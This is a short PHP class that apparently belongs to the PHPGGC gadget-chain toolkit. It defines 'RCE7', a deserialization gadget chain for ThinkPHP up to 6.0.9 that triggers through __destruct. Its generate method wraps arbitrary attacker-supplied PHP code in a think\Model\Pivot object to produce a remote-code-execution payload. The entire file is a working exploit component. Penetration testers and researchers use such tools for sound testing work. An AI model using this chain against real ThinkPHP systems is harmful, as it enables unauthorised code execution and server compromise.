<?php

namespace GadgetChain\ThinkPHP;

class RCE7 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '? <= 6.0.9';
    public static $vector = '__destruct';
    public static $author = '???';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        return new \think\Model\Pivot("<?php $code exit(); ?>");
    }
}